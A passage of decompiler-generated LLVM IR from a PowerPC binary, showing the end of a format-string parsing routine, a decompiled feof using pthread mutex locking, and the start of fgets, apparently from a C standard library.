  %v5_1000c770 = sext i16 %v4_1000c770 to i32
  store i32 %v5_1000c770, i32* %r9.global-to-local, align 4
  %v2_1000c774 = or i32 %v5_1000c760, %v1_1000c6f4
  store i32 %v2_1000c774, i32* %r0.global-to-local, align 4
  %v2_1000c778 = and i32 %v5_1000c770, %v2_1000c774
  store i32 %v2_1000c778, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c78c

dec_label_pc_1000c780:                            ; preds = %dec_label_pc_1000c71c
  %v1_1000c780 = add i32 %v1_1000c728, 1
  %v2_1000c780 = inttoptr i32 %v1_1000c780 to i8*
  %v3_1000c780 = load i8, i8* %v2_1000c780, align 1
  %v4_1000c780 = zext i8 %v3_1000c780 to i32
  store i32 %v4_1000c780, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c780, i32* @r8, align 4
  %v3_1000c784 = icmp eq i8 %v3_1000c780, 0
  br i1 %v3_1000c784, label %dec_label_pc_1000c78c, label %dec_label_pc_1000c71c

dec_label_pc_1000c78c:                            ; preds = %dec_label_pc_1000c780, %dec_label_pc_1000c750
  %v0_1000c78c = phi i32 [ %v2_1000c778, %dec_label_pc_1000c750 ], [ %v3_1000c70c, %dec_label_pc_1000c780 ]
  store i32 %v0_1000c78c, i32* %stack_var_-96, align 4
  %v0_1000c790 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c790 = call i32 @__asm_rlwinm(i32 %v0_1000c790, i32 30, i32 31, i32 31)
  %not.v2_1000c794 = icmp eq i32 %v1_1000c790, 0
  %v6_1000c798 = sext i1 %not.v2_1000c794 to i32
  store i32 %v6_1000c798, i32* %r9.global-to-local, align 4
  %v1_1000c79c = call i32 @__asm_rlwinm(i32 %v1_1000c6f4, i32 0, i32 20, i32 23)
  store i32 %v1_1000c79c, i32* %r0.global-to-local, align 4
  %v1_1000c7a0 = call i32 @__asm_rlwinm(i32 %v6_1000c798, i32 0, i32 0, i32 27)
  store i32 %v1_1000c7a0, i32* %r9.global-to-local, align 4
  %v0_1000c7a4 = load i32, i32* @r30, align 4
  %v1_1000c7a4 = inttoptr i32 %v0_1000c7a4 to i8*
  %v2_1000c7a4 = load i8, i8* %v1_1000c7a4, align 1
  %v3_1000c7a4 = zext i8 %v2_1000c7a4 to i32
  store i32 %v3_1000c7a4, i32* @r10, align 4
  %v0_1000c7a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c7a8 = call i32 @__asm_rlwinm(i32 %v0_1000c7a8, i32 0, i32 30, i32 28)
  %v1_1000c7ac = add i32 %v1_1000c7a0, 48
  store i32 %v1_1000c7ac, i32* %r9.global-to-local, align 4
  %v2_1000c7b0 = or i32 %v1_1000c7a8, %v1_1000c79c
  store i32 %v2_1000c7b0, i32* %r11.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v0_1000c7b8 = load i32, i32* @r10, align 4
  %v1_1000c7b8 = load i32, i32* @r28, align 4
  %v2_1000c7b8 = add i32 %v1_1000c7b8, 12
  %v3_1000c7b8 = inttoptr i32 %v2_1000c7b8 to i32*
  store i32 %v0_1000c7b8, i32* %v3_1000c7b8, align 4
  %v0_1000c7bc = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c7bc = load i32, i32* @r28, align 4
  %v2_1000c7bc = add i32 %v1_1000c7bc, 4
  %v3_1000c7bc = inttoptr i32 %v2_1000c7bc to i32*
  store i32 %v0_1000c7bc, i32* %v3_1000c7bc, align 4
  %v0_1000c7c0 = load i32, i32* @r31, align 4
  %v1_1000c7c0 = load i32, i32* @r28, align 4
  %v2_1000c7c0 = add i32 %v1_1000c7c0, 8
  %v3_1000c7c0 = inttoptr i32 %v2_1000c7c0 to i32*
  store i32 %v0_1000c7c0, i32* %v3_1000c7c0, align 4
  %v0_1000c7c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c7c4 = load i32, i32* @r28, align 4
  %v2_1000c7c4 = add i32 %v1_1000c7c4, 20
  %v3_1000c7c4 = inttoptr i32 %v2_1000c7c4 to i32*
  store i32 %v0_1000c7c4, i32* %v3_1000c7c4, align 4
  %v0_1000c7c8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c7c8 = load i32, i32* @r28, align 4
  %v2_1000c7c8 = add i32 %v1_1000c7c8, 16
  %v3_1000c7c8 = inttoptr i32 %v2_1000c7c8 to i32*
  store i32 %v0_1000c7c8, i32* %v3_1000c7c8, align 4
  %v0_1000c7cc = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c7cc = load i32, i32* @r28, align 4
  %v2_1000c7cc = add i32 %v1_1000c7cc, 28
  %v3_1000c7cc = inttoptr i32 %v2_1000c7cc to i32*
  store i32 %v0_1000c7cc, i32* %v3_1000c7cc, align 4
  %v0_1000c7d0 = load i32, i32* @r8, align 4
  %v1_1000c7d0 = inttoptr i32 %v0_1000c7d0 to i8*
  %v2_1000c7d0 = load i8, i8* %v1_1000c7d0, align 1
  %v3_1000c7d0 = zext i8 %v2_1000c7d0 to i32
  store i32 %v3_1000c7d0, i32* %r9.global-to-local, align 4
  %v3_1000c7d4 = icmp eq i8 %v2_1000c7d0, 0
  br i1 %v3_1000c7d4, label %dec_label_pc_1000c7dc, label %dec_label_pc_1000c7f4

dec_label_pc_1000c7dc:                            ; preds = %dec_label_pc_1000c78c
  %v0_1000c7dc = load i32, i32* @r30, align 4
  %v1_1000c7dc = inttoptr i32 %v0_1000c7dc to i8*
  %v2_1000c7dc = load i8, i8* %v1_1000c7dc, align 1
  %v3_1000c7dc = zext i8 %v2_1000c7dc to i32
  store i32 %v3_1000c7dc, i32* %r0.global-to-local, align 4
  %v3_1000c7e0 = icmp eq i8 %v2_1000c7dc, 109
  br i1 %v3_1000c7e0, label %dec_label_pc_1000c7e8, label %dec_label_pc_1000c92c

dec_label_pc_1000c7e8:                            ; preds = %dec_label_pc_1000c7dc
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000c7ec = load i32, i32* @r28, align 4
  %v2_1000c7ec = add i32 %v1_1000c7ec, 28
  %v3_1000c7ec = inttoptr i32 %v2_1000c7ec to i32*
  store i32 %v3_1000c7d0, i32* %v3_1000c7ec, align 4
  %v0_1000c7f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7f0 = load i32, i32* @r28, align 4
  %v2_1000c7f0 = add i32 %v1_1000c7f0, 32
  %v3_1000c7f0 = inttoptr i32 %v2_1000c7f0 to i32*
  store i32 %v0_1000c7f0, i32* %v3_1000c7f0, align 4
  br label %dec_label_pc_1000c7f4

dec_label_pc_1000c7f4:                            ; preds = %dec_label_pc_1000c78c, %dec_label_pc_1000c7e8
  %v0_1000c7f4 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000c7f4, 1
  br i1 %tmp62, label %dec_label_pc_1000c8d0, label %dec_label_pc_1000c7fc

dec_label_pc_1000c7fc:                            ; preds = %dec_label_pc_1000c7f4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000c800

dec_label_pc_1000c800:                            ; preds = %dec_label_pc_1000c8b8, %dec_label_pc_1000c7fc
  %v0_1000c828 = phi i32 [ 0, %dec_label_pc_1000c7fc ], [ %v1_1000c8bc, %dec_label_pc_1000c8b8 ]
  %v2_1000c800 = icmp sgt i32 %v0_1000c828, 2
  br i1 %v2_1000c800, label %dec_label_pc_1000c824, label %dec_label_pc_1000c808

dec_label_pc_1000c808:                            ; preds = %dec_label_pc_1000c800
  %v1_1000c808 = mul i32 %v0_1000c828, 4
  store i32 %v1_1000c808, i32* %r0.global-to-local, align 4
  %v0_1000c80c = load i32, i32* @r1, align 4
  %v2_1000c80c = add i32 %v0_1000c80c, %v1_1000c808
  store i32 %v2_1000c80c, i32* %r9.global-to-local, align 4
  %v1_1000c810 = add i32 %v2_1000c80c, 20
  %v2_1000c810 = inttoptr i32 %v1_1000c810 to i32*
  %v3_1000c810 = load i32, i32* %v2_1000c810, align 4
  store i32 %v3_1000c810, i32* %r0.global-to-local, align 4
  %v1_1000c814 = load i32, i32* @r28, align 4
  %v2_1000c814 = add i32 %v1_1000c814, %v0_1000c828
  store i32 %v2_1000c814, i32* %r9.global-to-local, align 4
  %v1_1000c818 = urem i32 %v3_1000c810, 256
  store i32 %v1_1000c818, i32* %r11.global-to-local, align 4
  %v1_1000c81c = trunc i32 %v3_1000c810 to i8
  %v3_1000c81c = add i32 %v2_1000c814, 36
  %v4_1000c81c = inttoptr i32 %v3_1000c81c to i8*
  store i8 %v1_1000c81c, i8* %v4_1000c81c, align 1
  %v0_1000c830.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c830

dec_label_pc_1000c824:                            ; preds = %dec_label_pc_1000c800
  %v2_1000c828 = add i32 %v0_1000c828, %stack_var_-84.3
  store i32 %v2_1000c828, i32* %r9.global-to-local, align 4
  %v1_1000c82c = add i32 %v2_1000c828, -2
  store i32 %v1_1000c82c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c830

dec_label_pc_1000c830:                            ; preds = %dec_label_pc_1000c808, %dec_label_pc_1000c824
  %v0_1000c850 = phi i32 [ %v0_1000c830.pre, %dec_label_pc_1000c808 ], [ %v1_1000c82c, %dec_label_pc_1000c824 ]
  %v1_1000c830 = load i32, i32* @r26, align 4
  %v3_1000c830 = icmp sgt i32 %v0_1000c850, %v1_1000c830
  br i1 %v3_1000c830, label %dec_label_pc_1000c838, label %dec_label_pc_1000c844

dec_label_pc_1000c838:                            ; preds = %dec_label_pc_1000c830
  %v2_1000c838 = icmp sgt i32 %v0_1000c850, 9
  br i1 %v2_1000c838, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c840

dec_label_pc_1000c840:                            ; preds = %dec_label_pc_1000c838
  store i32 %v0_1000c850, i32* @r26, align 4
  br label %dec_label_pc_1000c844

dec_label_pc_1000c844:                            ; preds = %dec_label_pc_1000c830, %dec_label_pc_1000c840
  store i32 %v2_1000c4e0.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000c848 = load i32, i32* @r27, align 4
  %v1_1000c848 = mul i32 %v0_1000c848, 4
  store i32 %v1_1000c848, i32* %r0.global-to-local, align 4
  %v2_1000c84c = add i32 %v1_1000c848, %v2_1000c4e0.pre-phi
  %v3_1000c84c = inttoptr i32 %v2_1000c84c to i32*
  %v4_1000c84c = load i32, i32* %v3_1000c84c, align 4
  store i32 %v4_1000c84c, i32* @r31, align 4
  %v1_1000c850 = add i32 %v0_1000c850, -1
  store i32 %v1_1000c850, i32* @r25, align 4
  %v1_1000c854 = mul i32 %v1_1000c850, 4
  %v3_1000c858 = icmp eq i32 %v4_1000c84c, 8
  %v1_1000c85c = load i32, i32* @r28, align 4
  %v2_1000c85c = add i32 %v1_1000c85c, %v1_1000c854
  store i32 %v2_1000c85c, i32* %r9.global-to-local, align 4
  %v1_1000c860 = add i32 %v2_1000c85c, 40
  %v2_1000c860 = inttoptr i32 %v1_1000c860 to i32*
  %v3_1000c860 = load i32, i32* %v2_1000c860, align 4
  store i32 %v3_1000c860, i32* %r3.global-to-local, align 4
  br i1 %v3_1000c858, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c868

dec_label_pc_1000c868:                            ; preds = %dec_label_pc_1000c844
  %v3_1000c868 = icmp eq i32 %v3_1000c860, 8
  br i1 %v3_1000c868, label %dec_label_pc_1000c8a0, label %dec_label_pc_1000c870

dec_label_pc_1000c870:                            ; preds = %dec_label_pc_1000c868
  %v4_1000c870 = icmp eq i32 %v3_1000c860, %v4_1000c84c
  br i1 %v4_1000c870, label %dec_label_pc_1000c8a0, label %dec_label_pc_1000c878

dec_label_pc_1000c878:                            ; preds = %dec_label_pc_1000c870
  %v1_1000c878 = call i32 @_promoted_size(i32 %v3_1000c860)
  store i32 %v1_1000c878, i32* @r29, align 4
  %v0_1000c880 = load i32, i32* @r31, align 4
  store i32 %v0_1000c880, i32* %r3.global-to-local, align 4
  %v1_1000c884 = call i32 @_promoted_size(i32 %v0_1000c880)
  store i32 %v1_1000c884, i32* %r3.global-to-local, align 4
  %v0_1000c890 = call i32 @__asm_mfcr()
  store i32 %v0_1000c890, i32* %r3.global-to-local, align 4
  store i32 %v0_1000c890, i32* %r0.global-to-local, align 4
  %v1_1000c894 = call i32 @__asm_rlwinm(i32 %v0_1000c890, i32 31, i32 31, i32 31)
  store i32 %v1_1000c894, i32* %r0.global-to-local, align 4
  %v3_1000c898 = icmp eq i32 %v1_1000c894, 0
  br i1 %v3_1000c898, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge

dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge: ; preds = %dec_label_pc_1000c878
  %v0_1000c8a4.pre = load i32, i32* @r27, align 4
  %v0_1000c8ac.pre = load i32, i32* @r25, align 4
  %v1_1000c8b0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c8a0

dec_label_pc_1000c8a0:                            ; preds = %dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge, %dec_label_pc_1000c870, %dec_label_pc_1000c868
  %v1_1000c8b0 = phi i32 [ %v1_1000c8b0.pre, %dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge ], [ %v1_1000c85c, %dec_label_pc_1000c870 ], [ %v1_1000c85c, %dec_label_pc_1000c868 ]
  %v0_1000c8ac = phi i32 [ %v0_1000c8ac.pre, %dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge ], [ %v1_1000c850, %dec_label_pc_1000c870 ], [ %v1_1000c850, %dec_label_pc_1000c868 ]
  %v0_1000c8a4 = phi i32 [ %v0_1000c8a4.pre, %dec_label_pc_1000c878.dec_label_pc_1000c8a0_crit_edge ], [ %v0_1000c848, %dec_label_pc_1000c870 ], [ %v0_1000c848, %dec_label_pc_1000c868 ]
  store i32 %v2_1000c4e0.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000c8a4 = mul i32 %v0_1000c8a4, 4
  store i32 %v1_1000c8a4, i32* %r0.global-to-local, align 4
  %v2_1000c8a8 = add i32 %v1_1000c8a4, %v2_1000c4e0.pre-phi
  %v3_1000c8a8 = inttoptr i32 %v2_1000c8a8 to i32*
  %v4_1000c8a8 = load i32, i32* %v3_1000c8a8, align 4
  store i32 %v4_1000c8a8, i32* %r0.global-to-local, align 4
  %v1_1000c8ac = mul i32 %v0_1000c8ac, 4
  %v2_1000c8b0 = add i32 %v1_1000c8ac, %v1_1000c8b0
  store i32 %v2_1000c8b0, i32* %r9.global-to-local, align 4
  %v2_1000c8b4 = add i32 %v2_1000c8b0, 40
  %v3_1000c8b4 = inttoptr i32 %v2_1000c8b4 to i32*
  store i32 %v4_1000c8a8, i32* %v3_1000c8b4, align 4
  br label %dec_label_pc_1000c8b8

dec_label_pc_1000c8b8:                            ; preds = %dec_label_pc_1000c878, %dec_label_pc_1000c844, %dec_label_pc_1000c8a0
  %v0_1000c8b8 = load i32, i32* @r28, align 4
  %v1_1000c8b8 = add i32 %v0_1000c8b8, 28
  %v2_1000c8b8 = inttoptr i32 %v1_1000c8b8 to i32*
  %v3_1000c8b8 = load i32, i32* %v2_1000c8b8, align 4
  %v0_1000c8bc = load i32, i32* @r27, align 4
  %v1_1000c8bc = add i32 %v0_1000c8bc, 1
  store i32 %v1_1000c8bc, i32* @r27, align 4
  %v1_1000c8c0 = add i32 %v3_1000c8b8, 2
  store i32 %v1_1000c8c0, i32* %r9.global-to-local, align 4
  %v2_1000c8c4 = icmp slt i32 %v1_1000c8bc, %v1_1000c8c0
  br i1 %v2_1000c8c4, label %dec_label_pc_1000c800, label %dec_label_pc_1000c8e8

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c7f4
  %v0_1000c8d0 = load i32, i32* @r28, align 4
  %v1_1000c8d0 = add i32 %v0_1000c8d0, 28
  %v2_1000c8d0 = inttoptr i32 %v1_1000c8d0 to i32*
  %v3_1000c8d0 = load i32, i32* %v2_1000c8d0, align 4
  store i32 %v3_1000c8d0, i32* %r5.global-to-local, align 4
  %v1_1000c8d4 = add i32 %v0_1000c8d0, 40
  store i32 %v1_1000c8d4, i32* @r3, align 4
  %v0_1000c8d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c8d8 = trunc i32 %v0_1000c8d8 to i8
  %v3_1000c8d8 = add i32 %v0_1000c8d0, 38
  %v4_1000c8d8 = inttoptr i32 %v3_1000c8d8 to i8*
  store i8 %v1_1000c8d8, i8* %v4_1000c8d8, align 1
  %v2_1000c8dc = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000c8dc, i32* @r4, align 4
  %v0_1000c8e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c8e0 = mul i32 %v0_1000c8e0, 4
  store i32 %v1_1000c8e0, i32* @r5, align 4
  store i32 268486888, i32* @lr, align 4
  %v0_1000c8e4 = call i32 @memcpy()
  store i32 %v0_1000c8e4, i32* %r3.global-to-local, align 4
  %v0_1000c8e8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c8e8

dec_label_pc_1000c8e8:                            ; preds = %dec_label_pc_1000c8b8, %dec_label_pc_1000c8d0
  %v0_1000c8e8 = phi i32 [ %v0_1000c8e8.pre, %dec_label_pc_1000c8d0 ], [ %v0_1000c8b8, %dec_label_pc_1000c8b8 ]
  %v1_1000c8e8 = add i32 %v0_1000c8e8, 16
  %v2_1000c8e8 = inttoptr i32 %v1_1000c8e8 to i32*
  %v3_1000c8e8 = load i32, i32* %v2_1000c8e8, align 4
  store i32 %v3_1000c8e8, i32* %r0.global-to-local, align 4
  %v0_1000c8ec = load i32, i32* @r26, align 4
  %v2_1000c8ec = add i32 %v0_1000c8e8, 24
  %v3_1000c8ec = inttoptr i32 %v2_1000c8ec to i32*
  store i32 %v0_1000c8ec, i32* %v3_1000c8ec, align 4
  %v0_1000c8f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c8f0 = and i32 %v0_1000c8f0, 128
  store i32 %v1_1000c8f0, i32* %r9.global-to-local, align 4
  %v3_1000c8f0 = icmp eq i32 %v1_1000c8f0, 0
  br i1 %v3_1000c8f0, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c904

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c8e8
  %v0_1000c8f8 = load i32, i32* @r30, align 4
  %v1_1000c8f8 = add i32 %v0_1000c8f8, 1
  store i32 %v1_1000c8f8, i32* %r0.global-to-local, align 4
  %v1_1000c8fc = load i32, i32* @r28, align 4
  %v2_1000c8fc = inttoptr i32 %v1_1000c8fc to i32*
  store i32 %v1_1000c8f8, i32* %v2_1000c8fc, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c904:                            ; preds = %dec_label_pc_1000c8e8
  %v2_1000c904 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000c904, i32* %r0.global-to-local, align 4
  %v0_1000c908 = load i32, i32* @r28, align 4
  %v1_1000c908 = inttoptr i32 %v0_1000c908 to i32*
  %v2_1000c908 = load i32, i32* %v1_1000c908, align 4
  %v1_1000c90c = load i32, i32* @r30, align 4
  %v2_1000c90c = sub i32 %v1_1000c90c, %v2_1000c904
  %v1_1000c910 = mul i32 %v2_1000c90c, 4
  store i32 %v1_1000c910, i32* %r0.global-to-local, align 4
  %v2_1000c914 = add i32 %v1_1000c910, %v2_1000c908
  store i32 %v2_1000c914, i32* %r9.global-to-local, align 4
  store i32 %v2_1000c914, i32* %v1_1000c908, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c8f8, %dec_label_pc_1000c904
  %v0_1000c91c = load i32, i32* @r28, align 4
  %v1_1000c91c = add i32 %v0_1000c91c, 28
  %v2_1000c91c = inttoptr i32 %v1_1000c91c to i32*
  %v3_1000c91c = load i32, i32* %v2_1000c91c, align 4
  store i32 %v3_1000c91c, i32* %r9.global-to-local, align 4
  %v1_1000c920 = add i32 %v3_1000c91c, 2
  br label %dec_label_pc_1000c92c

dec_label_pc_1000c92c:                            ; preds = %dec_label_pc_1000c490, %dec_label_pc_1000c564, %dec_label_pc_1000c640, %dec_label_pc_1000c634, %dec_label_pc_1000c65c, %dec_label_pc_1000c598, %dec_label_pc_1000c838, %dec_label_pc_1000c6e8, %dec_label_pc_1000c7dc, %dec_label_pc_1000c91c
  %storemerge2 = phi i32 [ %v1_1000c920, %dec_label_pc_1000c91c ], [ -1, %dec_label_pc_1000c7dc ], [ -1, %dec_label_pc_1000c6e8 ], [ -1, %dec_label_pc_1000c838 ], [ -1, %dec_label_pc_1000c598 ], [ -1, %dec_label_pc_1000c65c ], [ -1, %dec_label_pc_1000c634 ], [ -1, %dec_label_pc_1000c640 ], [ -1, %dec_label_pc_1000c564 ], [ -1, %dec_label_pc_1000c490 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000c428, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000c910, { 1, 0 }
  uselistorder i32 %v0_1000c8e8, { 1, 0 }
  uselistorder i32 %v1_1000c8bc, { 1, 2, 0 }
  uselistorder i32 %v1_1000c8a4, { 1, 0 }
  uselistorder i32 %v0_1000c890, { 0, 2, 1 }
  uselistorder i32 %v3_1000c860, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000c85c, { 1, 2, 0 }
  uselistorder i32 %v1_1000c850, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c848, { 1, 0 }
  uselistorder i32 %v0_1000c848, { 1, 2, 0 }
  uselistorder i32 %v3_1000c810, { 1, 0, 2 }
  uselistorder i32 %v1_1000c808, { 1, 0 }
  uselistorder i32 %v0_1000c828, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c780, { 1, 2, 0 }
  uselistorder i32 %v1_1000c758, { 2, 1, 0 }
  uselistorder i32 %v1_1000c744, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000c728, { 1, 0, 2 }
  uselistorder i32 %v1_1000c6f4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000c6b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000c674, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000c660, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000c5d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000c5cc, { 1, 0 }
  uselistorder i32 %v0_1000c5e4, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000c548, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000c540, { 1, 0 }
  uselistorder i32 %v1_1000c530, { 1, 0 }
  uselistorder i32 %v3_1000c528, { 1, 0, 2 }
  uselistorder i32 %v0_1000c5a4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000c574, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000c504, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000c4ec, { 1, 0 }
  uselistorder i32 %v2_1000c4e0.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000c4c0, { 1, 0 }
  uselistorder i32 %v1_1000c4a8, { 1, 2, 0 }
  uselistorder i32 %v0_1000c49c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 7, 8, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 6, 2, 0, 7, 8, 9, 3, 4, 5, 1 }
  uselistorder i32* %r11.global-to-local, { 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r0.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10018cfc.406 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10018cbc.405 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c92c, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000c91c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c844, { 1, 0 }
  uselistorder label %dec_label_pc_1000c830, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c73c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c698, { 1, 0 }
  uselistorder label %dec_label_pc_1000c66c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c620, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c61c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c590, { 1, 0 }
  uselistorder label %dec_label_pc_1000c588, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c528, { 1, 0 }
  uselistorder label %dec_label_pc_1000c524, { 1, 0 }
  uselistorder label %dec_label_pc_1000c510, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4ec, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4d0, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000c948 = call i32 @__asm_mfcr()
  %v2_1000c954 = add i32 %v0_1000c948, 56
  store i32 %v2_1000c954, i32* %r30.global-to-local, align 4
  %v2_1000c96c = add i32 %v0_1000c948, 52
  %v3_1000c96c = inttoptr i32 %v2_1000c96c to i32*
  %v4_1000c96c = load i32, i32* %v3_1000c96c, align 4
  %v3_1000c974 = icmp eq i32 %v4_1000c96c, 0
  store i1 %v3_1000c974, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000c974, label %dec_label_pc_1000c988, label %dec_label_pc_1000c988.thread

dec_label_pc_1000c988.thread:                     ; preds = %entry
  %v1_1000c9903 = inttoptr i32 %v0_1000c948 to i16*
  %v2_1000c9904 = load i16, i16* %v1_1000c9903, align 2
  %v3_1000c9905 = zext i16 %v2_1000c9904 to i32
  br label %dec_label_pc_1000c99c

dec_label_pc_1000c988:                            ; preds = %entry
  %v2_1000c970 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000c97c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 %v2_1000c954)
  %v0_1000c980 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c988.411 to i32), i32* @lr, align 4
  %v1_1000c984 = call i32 @pthread_mutex_lock(i32 %v0_1000c980)
  %v0_1000c990.pre = load i32, i32* @r31, align 4
  %v0_1000c994.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1000c970, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1000c990 = inttoptr i32 %v0_1000c990.pre to i16*
  %v2_1000c990 = load i16, i16* %v1_1000c990, align 2
  %v3_1000c990 = zext i16 %v2_1000c990 to i32
  br i1 %v0_1000c994.pre, label %dec_label_pc_1000c998, label %dec_label_pc_1000c99c

dec_label_pc_1000c998:                            ; preds = %dec_label_pc_1000c988
  store i32 268487068, i32* @lr, align 4
  %v0_1000c998 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1000c99c

dec_label_pc_1000c99c:                            ; preds = %dec_label_pc_1000c988.thread, %dec_label_pc_1000c988, %dec_label_pc_1000c998
  %v3_1000c9906 = phi i32 [ %v3_1000c9905, %dec_label_pc_1000c988.thread ], [ %v3_1000c990, %dec_label_pc_1000c988 ], [ %v3_1000c990, %dec_label_pc_1000c998 ]
  %v1_1000c9a0 = call i32 @__asm_rlwinm(i32 %v3_1000c9906, i32 0, i32 29, i32 29)
  %v1_1000c9b0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000c948)
  ret i32 %v1_1000c9a0

; uselistorder directives
  uselistorder i32 %v0_1000c948, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000c99c, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
